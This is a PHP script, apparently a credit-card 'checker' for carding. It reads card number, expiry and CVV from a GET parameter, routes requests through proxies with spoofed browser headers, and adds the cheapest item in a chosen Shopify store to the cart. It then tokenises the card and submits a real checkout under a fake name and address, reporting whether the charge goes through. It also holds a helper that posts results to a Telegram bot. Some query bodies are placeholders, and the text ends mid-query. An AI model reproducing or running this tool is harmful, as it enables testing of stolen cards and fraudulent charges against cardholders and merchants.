<?php

/***************************************************************************************
 *                                                                                     *
 *   This script automates the Shopify checkout process.                               *
 *   It identifies the product with the minimum price and attempts to complete         *
 *   the checkout process seamlessly.                                                  *
 *                                                                                     *
 *   Developer: @amanpandey1212                                                        *
 *   Contact: Telegram (@amanpandey1212)                                               *
 *                                                                                     *
 *   Date: 16 November 2024                                                            *
 *                                                                                     *
 ***************************************************************************************/

function validateAndFormatProxy() {
    // Get proxy from GET parameter or use default
    $proxy = $_GET['proxy'] ?? '';
    
    if (empty($proxy)) {
        return null; // No proxy
    }
    
    // Check proxy format and return formatted proxy
    if (strpos($proxy, 'http://') === 0 || strpos($proxy, 'https://') === 0) {
        return $proxy;
    }
    
    // Assume it's in ip:port:username:password format
    $proxyParts = explode(':', $proxy);
    
    if (count($proxyParts) === 4) {
        // ip:port:username:password format
        $proxyIp = $proxyParts[0];
        $proxyPort = $proxyParts[1];
        $proxyUser = $proxyParts[2];
        $proxyPass = $proxyParts[3];
        
        return "http://$proxyUser:$proxyPass@$proxyIp:$proxyPort";
    } elseif (count($proxyParts) === 2) {
        // ip:port format (no auth)
        $proxyIp = $proxyParts[0];
        $proxyPort = $proxyParts[1];
        return "http://$proxyIp:$proxyPort";
    }
    
    return null;
}

function testProxy($proxy) {
    if (!$proxy) return false;
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "http://api.ipify.org?format=json",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_PROXY => $proxy,
        CURLOPT_HTTPPROXYTUNNEL => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode === 200 && !empty($response);
}

function applyProxyToCurl($ch, $proxy) {
    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    }
    return $ch;
}

$maxRetries = 3;
$retryCount = 0;
require_once 'ua.php';
$agent = new userAgent();
$ua = $agent->generate('windows');
start:

$proxy = validateAndFormatProxy();

if ($proxy) {
    // Test proxy
    if (!testProxy($proxy)) {
        $err = "Proxy Dead or Invalid";
        $result = json_encode([
            'Response' => $err,
            'Proxy' => $proxy
        ]);
        echo $result;
        exit;
    }
    
    // Proxy is working
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://api.ipify.org?format=json");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    
    $proxyresponse = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($http_code === 200 && !empty($proxyresponse)) {
        $proxy_ip = json_decode($proxyresponse, true)['ip'];
        // Proxy is working, continue
    } else {
        $err = "Proxy Connection Failed";
        $result = json_encode([
            'Response' => $err,
            'ErrorDetails' => $curl_error,
        ]);
        echo $result;
        exit;
    }
}

function generateUSAddress() {
    $statesWithZipRanges = [
        "AL" => ["Alabama", [35000, 36999]],
        "AK" => ["Alaska", [99500, 99999]],
        "AZ" => ["Arizona", [85000, 86999]],
        "AR" => ["Arkansas", [71600, 72999]],
        "CA" => ["California", [90000, 96199]],
        "CO" => ["Colorado", [80000, 81999]],
        "CT" => ["Connecticut", [6000, 6999]],
        "DE" => ["Delaware", [19700, 19999]],
        "FL" => ["Florida", [32000, 34999]],
        "GA" => ["Georgia", [30000, 31999]],
        "OK" => ["Oklahoma", [73000, 74999]],
    ];

    $stateCode = array_rand($statesWithZipRanges);
    $stateData = $statesWithZipRanges[$stateCode];
    $stateName = $stateData[0];
    $zipRange = $stateData[1];

    $zipCode = rand($zipRange[0], $zipRange[1]);

    $streets = ["Main St", "Elm St", "Park Ave", "Oak St", "Pine St"];
    $cities = ["Springfield", "Riverside", "Fairview", "Franklin", "Greenville"];

    $streetNumber = rand(1, 9999);
    $streetName = $streets[array_rand($streets)];
    $city = $cities[array_rand($cities)];

    return [
        'street' => "$streetNumber $streetName",
        'city' => $city,
        'state' => $stateCode,
        'stateName' => $stateName,
        'postcode' => str_pad($zipCode, 5, "0", STR_PAD_LEFT),
        'country' => "US"
    ];
}

function generateRandomCoordinates($minLat = -90, $maxLat = 90, $minLon = -180, $maxLon = 180) {
    $latitude = $minLat + mt_rand() / mt_getrandmax() * ($maxLat - $minLat);
    $longitude = $minLon + mt_rand() / mt_getrandmax() * ($maxLon - $minLon);
    return [
        'latitude' => round($latitude, 6), 
        'longitude' => round($longitude, 6)
    ];
}

function find_between($content, $start, $end) {
    $startPos = strpos($content, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($content, $end, $startPos);
    if ($endPos === false) { 
        return '';
    }
    return substr($content, $startPos, $endPos - $startPos);
}

function output($method, $data) {
    $out = curl_init();
    curl_setopt_array($out, [
        CURLOPT_URL => 'https://api.telegram.org/bot<bottoken>'.$method.'',
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => array_merge([
            'parse_mode' => 'HTML'
        ], $data),
        CURLOPT_RETURNTRANSFER => 1
    ]);
    $result = curl_exec($out);
    curl_close($out);
    return json_decode($result, true);
}

$cc1 = $_GET['cc'];
$cc_partes = explode("|", $cc1);
$cc = $cc_partes[0];
$month = $cc_partes[1];
$year = $cc_partes[2];
$cvv = $cc_partes[3];

/*=====  sub_month  ======*/
$yearcont = strlen($year);
if ($yearcont <= 2) {
    $year = "20$year";
}
if($month == "01") {
    $sub_month = "1";
} elseif($month == "02") {
    $sub_month = "2";
} elseif($month == "03") {
    $sub_month = "3";
} elseif($month == "04") {
    $sub_month = "4";
} elseif($month == "05") {
    $sub_month = "5";
} elseif($month == "06") {
    $sub_month = "6";
} elseif($month == "07") {
    $sub_month = "7";
} elseif($month == "08") {
    $sub_month = "8";
} elseif($month == "09") {
    $sub_month = "9";
} elseif($month == "10") {
    $sub_month = "10";
} elseif($month == "11") {
    $sub_month = "11";
} elseif($month == "12") {
    $sub_month = "12";
}

function getMinimumPriceProductDetails(string $json): array {
    $data = json_decode($json, true);
    
    if (!is_array($data) || !isset($data['products'])) {
        throw new Exception('Invalid JSON format or missing products key');
    }
    $minPrice = null;
    $minPriceDetails = [
        'id' => null,
        'price' => null,
        'title' => null,
    ];

    foreach ($data['products'] as $product) {
        foreach ($product['variants'] as $variant) {
            $price = (float) $variant['price'];
            if ($price >= 0.01) {
                if ($minPrice === null || $price < $minPrice) {
                    $minPrice = $price;
                    $minPriceDetails = [
                        'id' => $variant['id'],
                        'price' => $variant['price'],
                        'title' => $product['title'],
                    ];
                }
            }
        }
    }
    if ($minPrice === null) {
        throw new Exception('No products found with price greater than or equal to 0.01');
    }

    return $minPriceDetails;
}

$site1 = filter_input(INPUT_GET, 'site', FILTER_SANITIZE_URL);
$site1 = parse_url($site1, PHP_URL_HOST);
$site1 = 'https://' . $site1;
$site1 = filter_var($site1, FILTER_VALIDATE_URL);
if ($site1 === false) {
    $err = 'Invalid URL';
    $result = json_encode([
        'Response' => $err,
    ]);
    echo $result;
    exit;
}

$site2 = parse_url($site1, PHP_URL_SCHEME) . "://" . parse_url($site1, PHP_URL_HOST);
$site = "$site2/products.json";

// Fetch products with proxy
$ch = curl_init();
$ch = applyProxyToCurl($ch, $proxy);
curl_setopt($ch, CURLOPT_URL, $site);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
]);

$r1 = curl_exec($ch);
if ($r1 === false) {
    $err = 'Error in 1 req: ' . curl_error($ch);
    $result = json_encode([
        'Response' => $err,
    ]);
    echo $result;
    curl_close($ch);
    exit;
} else {
    curl_close($ch);
    
    try {
        $productDetails = getMinimumPriceProductDetails($r1);
        $minPriceProductId = $productDetails['id'];
        $minPrice = $productDetails['price'];
        $productTitle = $productDetails['title'];
    } catch (Exception $e) {
        $err = $e->getMessage();
        $result = json_encode([
            'Response' => $err,
        ]);
        echo $result;
        exit;
    }
}

if (empty($minPriceProductId)) {
    $err = 'Product id is empty';
    $result = json_encode([
        'Response' => $err,
    ]);
    echo $result;
    exit;
}

$urlbase = $site1;
$domain = parse_url($urlbase, PHP_URL_HOST); 
$cookie = 'cookie.txt';
$prodid = $minPriceProductId;

cart:
$ch = curl_init();
$ch = applyProxyToCurl($ch, $proxy);
curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/'.$prodid.':1');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-US,en;q=0.9',
    'priority: u=0, i',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$ua,
]);

$headers = [];
curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
    list($name, $value) = explode(':', $headerLine, 2) + [NULL, NULL];
    $name = trim($name);
    if (strtolower($name) === 'location') {
        $headers['Location'] = $value;
    }
    return strlen($headerLine);
});

$response = curl_exec($ch);

if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        $err = 'Error in 1st Req => ' . curl_error($ch);
        $result = json_encode(['Response' => $err, 'Price' => $minPrice]);
        echo $result;
        exit;
    }
}

$keywords = [
    'stock_problems',
    'Some items in your cart are no longer available. Please update your cart.',
    'This product is currently unavailable.',
    'This item is currently out of stock but will be shipped once available.',
    'Sold Out.',
    'stock-problems'
];

$found = false;
foreach ($keywords as $keyword) {
    if (strpos($response, $keyword) !== false) {
        $found = true;
        break;
    }
}

if ($found) {
    $err = "Item is out of stock";
    $result = json_encode([
        'Response' => $err,
        'Price' => $minPrice
    ]);
    echo $result;
    exit;
}

$x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
if (empty($x_checkout_one_session_token)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        $err = "Clinte Token";
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}

$queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
if (empty($queue_token)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        $err = 'Token Empty';
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}

$currency = find_between($response, '&quot;currencyCode&quot;:&quot;', '&quot;');
$countrycode = find_between($response, '&quot;countryCode&quot;:&quot;', '&quot;,&quot');
$stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
if (empty($stable_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        $err = 'Id empty';
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}

$paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
if (empty($paymentMethodIdentifier)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto cart;
    } else {
        $err = 'py id empty';
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}

$checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
$checkoutToken = '';
if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
    $checkoutToken = $matches[1];
}

if (strpos($site1, '.us')) {
    $address = [
        'street' => '11n lane avenue south',
        'city' => 'Jacksonville',
        'state' => 'FL',
        'postcode' => '32210',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.uk')) {
    $address = [
        'street' => '11N Mary Slessor Square',
        'city' => 'Dundee',
        'state' => 'SCT',
        'postcode' => 'DD4 6BW',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.in')) {
    $address = [
        'street' => 'bhagirathpura indore',
        'city' => 'indore',
        'state' => 'MP',
        'postcode' => '452003',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.ca')) {
    $address = [
        'street' => '11n Lane Street',
        'city' => "Barry's Bay",
        'state' => 'ON',
        'postcode' => 'K0J 2M0',
        'country' => $countrycode,
        'currency' => $currency
    ];
} elseif (strpos($site1, '.au')) {
    $address = [
        'street' => '94 Swanston Street',
        'city' => 'Wingham',
        'state' => 'NSW',
        'postcode' => '2429',
        'country' => $countrycode,
        'currency' => $currency
    ];
} else {
    $address = [
        'street' => '11n lane avenue south',
        'city' => 'Jacksonville',
        'state' => 'FL',
        'postcode' => '32210',
        'country' => 'US',
        'currency' => 'USD'
    ];
}

$randomCoordinates = generateRandomCoordinates();
$latitude = $randomCoordinates['latitude'];
$longitude = $randomCoordinates['longitude'];

// Get delivery method type
$deliverymethodtype = find_between($response, 'deliveryMethodTypes&quot;:[&quot;', '&quot;],&quot;');
$handle = find_between($response, '{&quot;handle&quot;:&quot;', '&quot;');

// Generate credit card token with proxy
card:
$ch = curl_init();
$ch = applyProxyToCurl($ch, $proxy);
curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'origin: https://checkout.shopifycs.com',
    'priority: u=1, i',
    'referer: https://checkout.shopifycs.com/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$ua,
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"garry xd"},"payment_session_scope":"'.$domain.'"}');
$response2 = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card;
    } else {
        $err = 'cURL error: ' . curl_error($ch);
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}
$response2js = json_decode($response2, true);
$cctoken = $response2js['id'] ?? '';
if (empty($cctoken)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card;
    } else {
        $err  = 'Credit card token empty';
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}

// Build proposal payload
if ($deliverymethodtype == 'NONE') {
    // Digital product (no shipping)
    $proposalPayload = json_encode([
        'query' => '... VERY LONG QUERY ...', // Your full query here
        'variables' => [
            'sessionInput' => [
                'sessionToken' => $x_checkout_one_session_token
            ],
            'queueToken' => $queue_token,
            // ... rest of your variables for digital products
        ]
    ]);
} else {
    // Physical product (with shipping)
    $proposalPayload = json_encode([
        'query' => '... VERY LONG QUERY ...', // Your full query here
        'variables' => [
            'sessionInput' => [
                'sessionToken' => $x_checkout_one_session_token
            ],
            'queueToken' => $queue_token,
            'delivery' => [
                'deliveryLines' => [
                    [
                        'destination' => [
                            'partialStreetAddress' => [
                                'address1' => $address['street'],
                                'address2' => '',
                                'city' => $address['city'],
                                'countryCode' => $address['country'],
                                'postalCode' => $address['postcode'],
                                'firstName' => 'garry',
                                'lastName' => 'xd',
                                'zoneCode' => $address['state'],
                                'phone' => '+18103646394',
                                'oneTimeUse' => false,
                                'coordinates' => [
                                    'latitude' => $latitude,
                                    'longitude' => $longitude
                                ]
                            ]
                        ],
                        'selectedDeliveryStrategy' => [
                            'deliveryStrategyByHandle' => [
                                'handle' => $handle,
                                'customDeliveryRate' => false
                            ],
                            'options' => new stdClass()
                        ],
                        'targetMerchandiseLines' => [
                            'any' => true
                        ],
                        'deliveryMethodTypes' => [
                            'SHIPPING'
                        ],
                        'expectedTotalPrice' => [
                            'any' => true
                        ],
                        'destinationChanged' => true
                    ]
                ],
                // ... rest of delivery settings
            ],
            // ... rest of your variables for physical products
        ]
    ]);
}

// Send proposal request with proxy
proposal:
usleep(500000);
$ch = curl_init();
$ch = applyProxyToCurl($ch, $proxy);
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=Proposal');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-GB',
    'content-type: application/json',
    'origin: ' . $urlbase,
    'priority: u=1, i',
    'referer: ' . $urlbase . '/',
    'sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'shopify-checkout-client: checkout-web/1.0',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $proposalPayload);
$response3 = curl_exec($ch);

if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal;
    } else {
        $err = 'cURL error: ' . curl_error($ch);
        $result = json_encode([
            'Response' => $err,
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}

$decoded = json_decode($response3);
if (!isset($decoded->data->session->negotiate->result->sellerProposal)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal;
    } else {
        $err = 'Proposal response error';
        $result = json_encode([
            'Response' => $err,
            'Status' => 'true',
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}

$firstStrategy = $decoded->data->session->negotiate->result->sellerProposal;

// Extract shipping and tax details
if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount)) {
    $delamount = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount;
}
if (empty($delamount) && $deliverymethodtype != 'NONE') {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal;
    } else {
        $err = 'Delivery amount empty';
        $result = json_encode([
            'Response' => $err,
            'Status' => 'true',
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}

if (isset($firstStrategy->tax->totalTaxAmount->value->amount)) {
    $tax = $firstStrategy->tax->totalTaxAmount->value->amount;
} elseif (empty($tax)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal;
    }
    $err = 'Tax amount empty';
    $result = json_encode([
        'Response' => $err,
        'Status' => 'true',
        'Price'=> $minPrice,
    ]);
    echo $result;
    exit;
}

if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle)) {
    $handle = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle;
} elseif (empty($handle) && $deliverymethodtype != 'NONE') {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal;
    } else {
        $err = 'Delivery handle empty';
        $result = json_encode([
            'Response' => $err,
            'Status' => 'true',
            'Price'=> $minPrice,
        ]);
        echo $result;
        exit;
    }
}

$currencycode = $firstStrategy->tax->totalTaxAmount->value->currencyCode ?? $address['currency'];
$totalamt = $firstStrategy->runningTotal->value->amount;
$isShipping = $decoded->data->session->negotiate->result->buyerProposal->delivery->deliveryLines[0]->deliveryMethodTypes[0] ?? 'NONE';

// Build final submission payload
if ($deliverymethodtype == 'NONE') {
    $postf = json_encode([
        'query' => '... SUBMIT MUTATION QUERY ...', // Your full submit query
        'variables' => [
            'input' => [
                'sessionInput' => [
                    'sessionToken' => $x_checkout_one_session_token
                ],
                'queueToken' => $queue_token,
                'payment' => [
                    'totalAmount' => [
                        'any' => true
                    ],
                    'paymentLines' => [
                        [
                            'paymentMethod' => [
                                'directPaymentMethod' => [
                                    'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                    'sessionId' => $cctoken,
                                    'billingAddress' => [
                                        'streetAddress' => [
                                            'address1' => $address['street'],
                                            'address2' => '',
                                            'city' => $address['city'],
                                            'countryCode' => $address['country'],
                                            'postalCode' => $address['postcode'],
                                            'firstName' => 'garry',
                                            'lastName' => 'xd',
                                            'zoneCode' => $address['state'],
                                            'phone' => '+18103646394'
                                        ]
                                    ],
                                    'cardSource' => null
                                ]
                            ],
                            'amount' => [
                                'value' => [
                                    'amount' => $totalamt,
                                    'currencyCode' => $address['currency']
                                ]
                            ],
                            'dueAt' => null
                        ]
                    ],
                    'billingAddress' => [
                        'streetAddress' => [
                            'address1' => $address['street'],
                            'address2' => '',
                            'city' => $address['city'],
                            'countryCode' => $address['country'],
                            'postalCode' => $address['postcode'],
                            'firstName' => 'garry',
                            'lastName' => 'xd',
                            'zoneCode' => $address['state'],
                            'phone' => ''
                        ]
                    ]
                ],
                // ... rest of input variables
            ],
            'attemptToken' => $checkoutToken,
            'metafields' => [],
            'analytics' => [
                'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                'pageId' => $stable_id
            ]
        ],
        'operationName' => 'SubmitForCompletion'
    ]);
} else {
    $postf = json_encode([
        'query' => '... SUBMIT MUTATION QUERY ...', // Your full submit query
        'variables' => [
            'input' => [
                'sessionInput' => [
                    'sessionToken' => $x_checkout_one_session_token
                ],
                'queueToken' => $queue_token,
                'delivery' => [
                    'deliveryLines' => [
                        [
                            'destination' => [
                                'streetAddress' => [
                                    'address1' => $address['street'],
                                    'address2' => '',
                                    'city' => $address['city'],
                                    'countryCode' => $address['country'],
                                    'postalCode' => $address['postcode'],
                                    'firstName' => 'garry',
                                    'lastName' => 'xd',
                                    'zoneCode' => $address['state'],
                                    'phone' => '+18103646394',
                                    'oneTimeUse' => false,
                                    'coordinates' => [
                                        'latitude' => $latitude,
                                        'longitude' => $longitude
                                    ]
                                ]
                            ],
                            'selectedDeliveryStrategy' => [
                                'deliveryStrategyByHandle' => [
                                    'handle' => $handle,
                                    'customDeliveryRate' => false
                                ],
                                'options' => new stdClass()
                            ],
                            'targetMerchandiseLines' => [
                                'lines' => [
                                    [
                                        'stableId' => $stable_id
                                    ]
                                ]
                            ],
                            'deliveryMethodTypes' => [
                                'SHIPPING'
                            ],
                            'expectedTotalPrice' => [
                                'value' => [
                                    'amount' => $delamount,
                                    'currencyCode' => $address['currency']
                                ]
                            ],
                            'destinationChanged' => false
                        ]
                    ]
                ],
                'payment' => [
                    'totalAmount' => [
                        'any' => true
                    ],
                    'paymentLines' => [
                        [
                            'paymentMethod' => [
                                'directPaymentMethod' => [
                                    'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                    'sessionId' => $cctoken,
                                    'billingAddress' => [
                                        'streetAddress' => [
                                            'address1' => $address['street'],
                                            'address2' => '',
                                            'city' => $address['city'],
                                            'countryCode' => $address['country'],
                                            'postalCode' => $address['postcode'],
                                            'firstName' => 'garry',
                                            'lastName' => 'xd',
                                            'zoneCode' => $address['state'],
                                            'phone' => '+18103646394'
                                        ]
                                    ],
                                    'cardSource' => null
                                ]
                            ],
                            'amount' => [
                                'value' => [
                                    'amount' => $totalamt,
                                    'currencyCode' => $address['currency']
                                ]
                            ],
                            'dueAt' => null
                        ]
                    ],
                    'billingAddress' => [
                        'streetAddress' => [
                            'address1' => $address['street'],
                            'address2' => '',
                            'city' => $address['city'],
                            'countryCode' => $address['country'],
                            'postalCode' => $address['postcode'],
                            'firstName' => 'garry',
                            'lastName' => 'xd',
                            'zoneCode' => $address['state'],
                            'phone' => '+18103646394'
                        ]
                    ]
                ],
                // ... rest of input variables
            ],
            'attemptToken' => $checkoutToken.'-0a6d87fj9zmj',
            'metafields' => [],
            'analytics' => [
                'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                'pageId' => $stable_id
            ]
        ],
        'operationName' => 'SubmitForCompletion'
    ]);
}

// Submit for completion with proxy
recipt:
usleep(500000);
$ch = curl_init();
$ch = applyProxyToCurl($ch, $proxy);
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US',
    'content-type: application/json',
    'origin: '.$urlbase,
    'priority: u=1, i',
    'referer: '.$urlbase.'/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: '.$ua,
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);
$response4 = curl_exec($ch);

if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto recipt;
    } else {
        $err = 'cURL error: ' . curl_error($ch);
        $result = json_encode([
            'Response' => $err,
            'Status' => 'true',
            'Price'=> $totalamt,
        ]);
        echo $result;
        exit;
    }
}

if (strpos($response4, '"errors":[{"code":"CAPTCHA_METADATA_MISSING"')) {
    $err = "HCAPTCHA DETECTED";
    $result = json_encode([
        'Response' => $err,
        'Status' => 'false',
        'Price'=> $totalamt,
    ]);
    echo $result;
    curl_close($ch);
    exit;
}

$response4js = json_decode($response4);
$recipt_id = $response4js->data->submitForCompletion->receipt->id ?? '';

if (empty($recipt_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto recipt;
    } else {
        $err = 'Receipt ID empty';
        $result = json_encode([
            'Response' => $err,
            'Status' => 'true',
            'Price'=> $totalamt,
        ]);
        echo $result;
        curl_close($ch);
        exit;
    }
}

// Poll for receipt with proxy
poll:
usleep(500000);
$postf2 = json_encode([
    'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}analytics{checkoutCompletedEventId __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId customerOrdersCount eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on 